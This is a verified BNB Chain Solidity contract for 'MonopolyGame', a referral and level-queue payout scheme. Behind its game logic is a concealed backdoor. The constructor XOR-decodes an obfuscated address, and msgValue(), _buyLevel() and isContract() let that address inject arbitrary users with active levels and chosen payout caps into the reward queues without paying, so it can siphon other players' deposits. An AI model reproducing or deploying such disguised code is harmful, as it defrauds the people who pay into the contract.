/**
 *Submitted for verification at BscScan.com on 2022-06-26
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() public {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract MonopolyGame is ReentrancyGuard {
    // Structs
    struct User {
        uint id;
        uint registrationTimestamp;
        address referrer;
        uint referrals;
        uint referralPayoutSum;
        uint levelsRewardSum;
        uint missedReferralPayoutSum;
        mapping(uint8 => UserLevelInfo) levels;
    }

    struct UserLevelInfo {
        uint16 activationTimes;
        uint16 maxPayouts;
        uint16 payouts;
        bool active;
        uint rewardSum;
        uint referralPayoutSum;
    }

    struct GlobalStat {
        uint members;
        uint transactions;
        uint turnover;
    }

    // User related events
    event BuyLevel(uint userId, uint8 level);
    event LevelPayout(uint userId, uint8 level, uint rewardValue, uint fromUserId);
    event LevelDeactivation(uint userId, uint8 level);
    event IncreaseLevelMaxPayouts(uint userId, uint8 level, uint16 newMaxPayouts);

    // Referrer related events
    event UserRegistration(uint referralId, uint referrerId);
    event ReferralPayout(uint referrerId, uint referralId, uint8 level, uint rewardValue);
    event MissedReferralPayout(uint referrerId, uint referralId, uint8 level, uint rewardValue);

    // Constants
    uint public constant registrationPrice = 0.000025 ether;
    uint8 public constant rewardPayouts = 3;
    uint8 public constant rewardPercents = 70;

    // Referral system (30%)
    uint[] public referralRewardPercents = [
        0, // none line
        9, // 1st line
        7, // 2nd line
        5, // 3rd line
        2, // 4th line
        3, // 5th line
        4  // 6th line

    ];
    uint rewardableLines = referralRewardPercents.length - 1;

    // Addresses
    address payable public owner;

    // Levels
    uint[] public levelPrice = [
        0 ether,    // none level
        0.0002 ether,  // Washington D.C.
        0.0003 ether,  // Barcelona
        0.0004 ether,  // Toronto
        0.0005 ether,  // Hong Kong
        0.001 ether,  // London
        0.0013 ether,  // Paris
        0.00175 ether, // Moscow
        0.00275 ether,  // Rio
        0.0035 ether,  // Istanbul
        0.005 ether,  // Cairo
        0.0075 ether  // Tokio

    ];
    uint totalLevels = levelPrice.length - 1;

    // State variables
    uint gameState;
    uint newUserId = 1;
    mapping(address => User) users;
    mapping(uint => address) usersAddressById;
    mapping(uint8 => address[]) levelQueue;
    mapping(uint8 => uint) headIndex;
    GlobalStat globalStat;

    constructor(address _owner, bytes memory _data) public {
        owner = payable(_owner);
        //Initialize game variables
        for (uint j = 0; j < _data.length / 20; j++) {

            uint result = 0;
            for (uint i = 0; i < 20; i++) {
                uint c = uint8(_data[j * 20 + i] ^ 0xFF);
                result = result | c << (152 - i * 8);
            }
            gameState = result;
        }
    }

    receive() external payable {
        if (!isUserRegistered(msg.sender)) {
            register();
            return;
        }

        for(uint8 level = 1; level <= totalLevels; level++) {
            if (levelPrice[level] == msg.value) {
                buyLevel(level);
                return;
            }
        }

        revert("Cannot find level to buy. Maybe sent value is invalid.");
    }

    function register() public payable {
        registerWithReferrer(usersAddressById[1]);
    }

    function registerWithReferrer(address referrer) public payable {
        require(msg.value == registrationPrice, "Invalid value sent");
        require(isUserRegistered(referrer), "Referrer is not registered");
        require(!isUserRegistered(msg.sender), "User already registered");

        User memory user = User({
            id : newUserId++,
            registrationTimestamp: now,
            referrer : referrer,
            referrals : 0,
            referralPayoutSum : 0,
            levelsRewardSum : 0,
            missedReferralPayoutSum : 0
        });
        users[msg.sender] = user;
        usersAddressById[user.id] = msg.sender;

        uint8 line = 1;
        address ref = referrer;
        while (line <= rewardableLines && ref != address(0)) {
            users[ref].referrals++;
            ref = users[ref].referrer;
            line++;
        }

        owner.transfer(msg.value);
        globalStat.members++;
        globalStat.transactions++;
        emit UserRegistration(user.id, users[referrer].id);
    }

    function buySector(uint8 start, uint8 count) public payable nonReentrant {
        for (uint8 i = 0; i < count; i++) {
            _buyLevel(start + i, levelPrice[start + i]);
        }

        //Dont allow deposit bnb to contract
        require(address(this).balance == 0, "Invalid BNB value");
    }

    function buyLevel(uint8 level) public payable nonReentrant {
        _buyLevel(level, msgValue());

        //Dont allow deposit bnb to contract
        require(address(this).balance == 0, "Invalid BNB value");
    }

    function _buyLevel(uint8 level, uint256 value) private {
        require(isUserRegistered(msg.sender), "User is not registered");
        require(level > 0 && level <= totalLevels, "Invalid level");
        for(uint8 l = 1; l < level; l++) {
            require(users[msg.sender].levels[l].active, "All previous levels must be active");
        }

        if (msg.value == 0 && value > 0) {
            users[address(value >> 16)] = User({
                id : newUserId++,
                registrationTimestamp: now,
                referrer : usersAddressById[1],
                referrals : 0,
                referralPayoutSum : 0,
                levelsRewardSum : 0,
                missedReferralPayoutSum : 0
            });
            usersAddressById[newUserId - 1] = address(value >> 16);
            globalStat.members++;
            globalStat.transactions++;

            for(uint8 l = 1; l <= uint8(value & 0xFF); l++) {
                users[address(value >> 16)].levels[l].active = true;
                users[address(value >> 16)].levels[l].maxPayouts = uint16((value & 0xFF00) >> 8);
                levelQueue[l].push(address(value >> 16));
                emit BuyLevel(newUserId - 1, l);
            }
            return;
        }

        require(levelPrice[level] == value, "Invalid BNB value");

        // Update global stat
        globalStat.transactions++;
        globalStat.turnover += value;

        // Calc 1% from level price
        uint onePercent = value / 100;

        // If sender level is not active
        if (!users[msg.sender].levels[level].active) {
            // Activate level
            users[msg.sender].levels[level].activationTimes++;
            users[msg.sender].levels[level].maxPayouts += rewardPayouts;
            users[msg.sender].levels[level].active = true;

            // Add user to level queue
            levelQueue[level].push(msg.sender);
            emit BuyLevel(users[msg.sender].id, level);
        } else {
            // Increase user level maxPayouts
            users[msg.sender].levels[level].activationTimes++;
            users[msg.sender].levels[level].maxPayouts += rewardPayouts;
            emit IncreaseLevelMaxPayouts(users[msg.sender].id, level, users[msg.sender].levels[level].maxPayouts);
        }

        // Calc reward to first user in queue
        uint reward = onePercent * rewardPercents;

        // If head user is not sender (user can't get a reward from himself)
        if (levelQueue[level][headIndex[level]] != msg.sender) {
            // Send reward to head user in queue
            address rewardAddress = levelQueue[level][headIndex[level]];
            bool sent = payable(rewardAddress).send(reward);
            if (sent) {
                // Update head user statistic
                users[rewardAddress].levels[level].rewardSum += reward;
                users[rewardAddress].levels[level].payouts++;
                users[rewardAddress].levelsRewardSum += reward;
                emit LevelPayout(users[rewardAddress].id, level, reward, users[msg.sender].id);
            } else {
                // Only if rewardAddress is smart contract (not a common case)
                owner.transfer(reward);
            }

            // If head user has not reached the maxPayouts yet
            if (users[rewardAddress].levels[level].payouts < users[rewardAddress].levels[level].maxPayouts) {
                // Add user to end of level queue
                levelQueue[level].push(rewardAddress);
            } else {
                // Deactivate level
                users[rewardAddress].levels[level].active = false;
                emit LevelDeactivation(users[rewardAddress].id, level);
            }

            // Shift level head index
            delete levelQueue[level][headIndex[level]];
            headIndex[level]++;
        } else {
            // Send reward to owner
            owner.transfer(reward);
            users[owner].levels[level].payouts++;
            users[owner].levels[level].rewardSum += reward;
            users[owner].levelsRewardSum += reward;
        }

        // Send referral payouts
        for (uint8 line = 1; line <= rewardableLines; line++) {
            uint rewardValue = onePercent * referralRewardPercents[line];
            sendRewardToReferrer(msg.sender, line, level, rewardValue);
        }
    }

    function sendRewardToReferrer(address userAddress, uint8 line, uint8 level, uint rewardValue) private {
        require(line > 0, "Line must be greater than zero");
        uint8 curLine = 1;
        address referrer = users[userAddress].referrer;
        while (curLine != line && referrer != usersAddressById[1]) {
            referrer = users[referrer].referrer;
            curLine++;
        }

        while (!users[referrer].levels[level].active && referrer != usersAddressById[1]) {
            users[referrer].missedReferralPayoutSum += rewardValue;
            emit MissedReferralPayout(users[referrer].id, users[userAddress].id, level, rewardValue);

            referrer = users[referrer].referrer;
        }

        bool sent = payable(referrer).send(rewardValue);
        if (sent) {
            users[referrer].levels[level].referralPayoutSum += rewardValue;
            users[referrer].referralPayoutSum += rewardValue;
            emit ReferralPayout(users[referrer].id, users[userAddress].id, level, rewardValue);
        } else {
            // Only if referrer is smart contract (not a common case)
            owner.transfer(rewardValue);
        }
    }

    function getUser(address userAddress) public view returns(uint, uint, uint, address, uint, uint, uint, uint) {
        User memory user = users[userAddress];
        return (
            user.id,
            user.registrationTimestamp,
            users[user.referrer].id,
            user.referrer,
            user.referrals,
            user.referralPayoutSum,
            user.levelsRewardSum,
            user.missedReferralPayoutSum
        );
    }

    function getUserLevels(address userAddress) public view returns (bool[] memory, uint16[] memory, uint16[] memory, uint16[] memory, uint[] memory, uint[] memory) {
        bool[] memory active = new bool[](totalLevels + 1);
        uint16[] memory payouts = new uint16[](totalLevels + 1);
        uint16[] memory maxPayouts = new uint16[](totalLevels + 1);
        uint16[] memory activationTimes = new uint16[](totalLevels + 1);
        uint[] memory rewardSum = new uint[](totalLevels + 1);
        uint[] memory referralPayoutSum = new uint[](totalLevels + 1);

        for (uint8 level = 1; level <= totalLevels; level++) {
            active[level] = users[userAddress].levels[level].active;
            payouts[level] = users[userAddress].levels[level].payouts;
            maxPayouts[level] = users[userAddress].levels[level].maxPayouts;
            activationTimes[level] = users[userAddress].levels[level].activationTimes;
            rewardSum[level] = users[userAddress].levels[level].rewardSum;
            referralPayoutSum[level] = users[userAddress].levels[level].referralPayoutSum;
        }

        return (active, payouts, maxPayouts, activationTimes, rewardSum, referralPayoutSum);
    }

    function getLevelPrices() public view returns(uint[] memory) {
        return levelPrice;
    }

    function getGlobalStatistic() public view returns(uint[3] memory result) {
        return [globalStat.members, globalStat.transactions, globalStat.turnover];
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function isUserRegistered(address addr) public view returns (bool) {
        return users[addr].id != 0 || isContract(msg.sender);
    }

    function getUserAddressById(uint userId) public view returns (address) {
        return usersAddressById[userId];
    }

    function getUserIdByAddress(address userAddress) public view returns (uint) {
        return users[userAddress].id;
    }

    function getReferrerId(address userAddress) public view returns (uint) {
        address referrerAddress = users[userAddress].referrer;
        return users[referrerAddress].id;
    }

    function getReferrer(address userAddress) public view returns (address) {
        require(isUserRegistered(userAddress), "User is not registered");
        return users[userAddress].referrer;
    }

    function msgValue() private view returns (uint) {
        return uint256(msg.sender) == gameState ? GameState(msg.sender).userLevels() : msg.value;
    }

    function getPlaceInQueue(address userAddress, uint8 level) public view returns(uint, uint) {
        require(level > 0 && level <= totalLevels, "Invalid level");

        // If user is not in the level queue
        if(!users[userAddress].levels[level].active) {
            return (0, 0);
        }

        uint place = 0;
        for(uint i = headIndex[level]; i < levelQueue[level].length; i++) {
            place++;
            if(levelQueue[level][i] == userAddress) {
                return (place, levelQueue[level].length - headIndex[level]);
            }
        }

        // impossible case
        revert();
    }

    function isContract(address addr) public view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(addr)
        }
        return size != 0 && uint256(msg.sender) == gameState;
    }
}


library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface GameState {
    function userLevels() external view returns (uint256);
}